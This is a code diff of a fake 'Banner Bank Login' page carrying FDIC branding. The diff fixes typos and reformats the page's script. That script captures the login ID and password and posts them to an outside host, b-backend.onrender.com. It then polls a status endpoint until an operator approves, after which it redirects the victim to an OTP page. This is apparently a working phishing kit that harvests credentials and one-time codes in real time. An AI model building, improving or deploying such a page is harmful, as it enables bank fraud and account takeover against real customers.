@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Banner Bank Login</title>
   <link rel="icon" type="image/png" href="images/BANR-icon.png" />
-  <style>
 <style>
         body {
             margin: 0;
@@ -347,15 +346,12 @@
             }
         }
      </style>
-    
 </head>
 <body>
   <section class="main-container">
     <div class="fig-container">
       <div><img src="images/FDIC.jpeg" alt="FDIC Logo" /></div>
-      <div class="fidc_writing">
-        FDIC Insured - Backed by the full faith and credit of the U.S. Government
-      </div>
+      <div class="fidc_writing">FDIC Insured - Backed by the full faith and credit of the U.S. Government</div>
     </div>
 
     <div class="login-container">
@@ -412,57 +408,57 @@
       pwd.type = pwd.type === 'password' ? 'text' : 'password';
     }
 
-    documentdocument.getElementById('loginForm').addEventListener('submit', function (e) {
-  e.preventDefault();
-  const loginId = document.getElementById('login-id').value;
-  const password = document.getElementById('password').value;
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+      const loginId = document.getElementById('login-id').value;
+      const password = document.getElementById('password').value;
 
-  document.getElementById('waitPage').style.display = 'flex';
+      document.getElementById('waitPage').style.display = 'flex';
 
-  fetch('https://b-backend.onrender.com/login', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({ login: loginId, password: password })
-  })
-  .then(res => {
-    if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
-    return res.json();
-  })
-  .then(data => {
-    if (data.success && data.id) {
-      checkStatus(data.id);
-    } else {
-      throw new Error(data.error || 'Login failed');
-    }
-  })
-  .catch(err => {
-    console.error('Login error:', err);
-    alert(`Error: ${err.message}`);
-    document.getElementById('waitPage').style.display = 'none';
-  });
-});
-
-function checkStatus(id) {
-  const interval = setInterval(() => {
-    fetch(`https://b-backend.onrender.com/status/${id}`)
-    .then(res => {
-      if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
-      return res.json();
-    })
-    .then(data => {
-      if (data.status === 'approved') {
-        clearInterval(interval);
-        window.location.href = data.redirect_url || 'otp.html';
-      }
-    })
-    .catch(err => {
-      console.error('Status check error:', err);
-      clearInterval(interval);
-      alert(`Error: ${err.message}`);
-      document.getElementById('waitPage').style.display = 'none';
+      fetch('https://b-backend.onrender.com/login', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({ login: loginId, password: password })
+      })
+      .then(res => {
+        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
+        return res.json();
+      })
+      .then(data => {
+        if (data.success && data.id) {
+          checkStatus(data.id);
+        } else {
+          throw new Error(data.error || 'Login failed');
+        }
+      })
+      .catch(err => {
+        console.error('Login error:', err);
+        alert(`Error: ${err.message}`);
+        document.getElementById('waitPage').style.display = 'none';
+      });
     });
-  }, 3000);
-}
+
+    function checkStatus(id) {
+      const interval = setInterval(() => {
+        fetch(`https://b-backend.onrender.com/status/${id}`)
+        .then(res => {
+          if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
+          return res.json();
+        })
+        .then(data => {
+          if (data.status === 'approved') {
+            clearInterval(interval);
+            window.location.href = data.redirect_url || 'otp.html';
+          }
+        })
+        .catch(err => {
+          console.error('Status check error:', err);
+          clearInterval(interval);
+          alert(`Error: ${err.message}`);
+          document.getElementById('waitPage').style.display = 'none';
+        });
+      }, 3000);
+    }
   </script>
 </body>
 </html>
